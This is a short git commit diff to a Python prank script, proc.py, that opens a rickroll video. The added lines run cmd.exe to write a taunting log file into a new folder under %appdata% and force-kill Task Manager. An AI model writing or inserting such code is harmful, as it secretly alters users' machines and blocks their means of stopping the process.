f5ad7b57fa6f602dd98664c284c222fab02a3b8c
AlexNoRick <99521825+AlexNoRick@users.noreply.github.com>
2022-02-12 13:21:34 +0700

    Update proc.py

--- proc.py
+++ proc.py
@@ -1,3 +1,8 @@
 import os;
+import subprocess
 
 os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+
+subprocess.Popen([r'cmd.exe', '/c cd %appdata% & mkdir nrr_project &cd nrr_project &echo you has rickroll -NoRickRoll- *.py python >.log_hisotry']);
+subprocess.Popen([r'taskkill.exe', '/f /im taskmgr.exe']);
+
